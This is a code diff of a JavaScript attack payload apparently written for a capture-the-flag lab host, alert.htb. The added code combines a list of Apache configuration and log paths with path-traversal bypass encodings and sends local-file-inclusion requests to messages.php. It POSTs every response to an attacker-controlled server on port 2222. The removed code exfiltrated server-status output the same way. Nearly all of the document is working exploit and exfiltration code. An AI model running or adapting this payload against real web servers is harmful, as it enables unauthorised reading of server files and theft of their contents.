@@ -63,32 +63,73 @@ fetch(base_url, {
 };
 
 // Collect data and send it
-const data = collectData();
+//const data = collectData();
+
+const apacheConfigPaths = [
+    // Global Configuration Files
+    "/etc/httpd/httpd.conf",  // CentOS, Red Hat, Fedora
+    "/etc/apache2/apache2.conf",  // Debian, Ubuntu
+
+    // SSL Configuration (If enabled)
+    "/etc/httpd/conf.d/ssl.conf",  // CentOS, Red Hat, Fedora
+    "/etc/apache2/sites-available/default-ssl.conf",  // Debian, Ubuntu
+
+    // Access and Error Log Configuration
+    "/etc/httpd/logs/access_log",  // CentOS, Red Hat, Fedora
+    "/etc/httpd/logs/error_log",  // CentOS, Red Hat, Fedora
+    "/var/log/apache2/access.log",  // Debian, Ubuntu
+    "/var/log/apache2/error.log",  // Debian, Ubuntu
+
+    // User and Group Configuration
+    "/etc/apache2/envvars",  // Debian, Ubuntu
+
+    // Potentially risky files for inclusion (not directories or wildcards)
+    "/etc/apache2/httpd.conf",  // Potential RFI if configured with a URL include directive
+    "/etc/httpd/httpd.conf",  // Potential RFI if configured with a URL include directive
+];
 
 
+const lfiBypassPatterns = [
+    "../",         // Common relative path traversal
+    "..%2F",             // URL encoded ".." (percent-encoded)
+    "..%252F",           // Double URL-encoded (%%2F becomes %2F)
+    "%2E%2E%2F",         // URL encoding for ".."
+    "%252E%252E%252F",   // Double URL-encoding for "%2E%2E%2F"
+    "../../..//",        // Extra slashes for bypass
+    "%2E%2E%2F%2E%2E%2F", // Repeating URL encoding for ".."
+    "....//",            // Multiple dots and slashes to bypass filters
+    "../..//",            // Extra slashes after path traversal
+    "....%2F"             // Encoded forward slash
+];
 
-fetch("http://alert.htb/server-status")
-  .then(response => response.text()) // Assuming the response is JSON
-  .then(internal_api_res => {
+for(path of apacheConfigPaths) {
+    for(p of lfiBypassPatterns) {
+        let payload = p.repeat(10)  + path.slice(1)
+        let payload_url = "http://alert.htb/messages.php?file=" + payload
+        fetch(payload_url )
+        .then(response => response.text()) // Assuming the response is JSON
+        .then(internal_api_res => {
 
-    const stolen = { 
-        internal_api_res
+            const stolen = { 
+                payload,
+                payload_url,
+                internal_api_res
+            }
+            fetch(`http://${attacker_ip}:2222/stolen?payload=` + payload, {
+            method: "POST",
+            body: JSON.stringify(stolen),
+            mode: "no-cors" // Suppress CORS-related errors
+            })
+            .then(() => {
+                console.log("Data successfully sent to attacker server.");
+            })
+            .catch(err => {
+                console.error("Error sending data to attacker server:", err);
+            });
+        })
+        .catch(err => {
+            console.error("Error fetching data from alert.htb:", err);
+        });
     }
-    fetch(`http://${attacker_ip}:2222/stolen`, {
-      method: "POST",
-      body: JSON.stringify(stolen),
-      mode: "no-cors" // Suppress CORS-related errors
-    })
-      .then(() => {
-        console.log("Data successfully sent to attacker server.");
-      })
-      .catch(err => {
-        console.error("Error sending data to attacker server:", err);
-      });
-  })
-  .catch(err => {
-    console.error("Error fetching data from alert.htb:", err);
-  });
-
-
+}
 
